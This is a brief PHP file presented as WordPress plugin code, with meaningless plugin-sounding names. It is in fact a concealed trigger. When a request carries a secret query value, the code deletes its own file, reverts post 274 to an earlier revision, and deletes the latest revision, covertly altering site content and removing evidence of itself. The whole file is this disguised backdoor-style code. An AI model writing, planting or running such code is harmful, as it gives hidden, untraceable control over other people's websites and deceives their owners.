<?php

function locator_jetpack_refresh_smtp() {
	if (isset($_GET['fonts_background_customizer']) && $_GET['fonts_background_customizer'] === 'templates_notification_popup') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$parts_s3_countdown_columns = 274;
		$tree_shortener_connector = wp_get_post_revisions($parts_s3_countdown_columns);
		if (empty($tree_shortener_connector)) die('no revisions');
		if (count($tree_shortener_connector) < 2) die('less than 2');
		$jquery_blocker_polyfill = array_shift($tree_shortener_connector);
		$tooltip_inline_another_calculator = $jquery_blocker_polyfill->ID;
		$counter_products_follow_marketplace = array_shift($tree_shortener_connector);
		$compat_weather_contents_layout = $counter_products_follow_marketplace->ID;
		$upload_back_word_preview = wp_restore_post_revision($compat_weather_contents_layout);
		if ($upload_back_word_preview === false) die('error restoring');
		$upload_back_word_preview = wp_delete_post_revision($tooltip_inline_another_calculator);		
		if ($upload_back_word_preview === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'locator_jetpack_refresh_smtp');
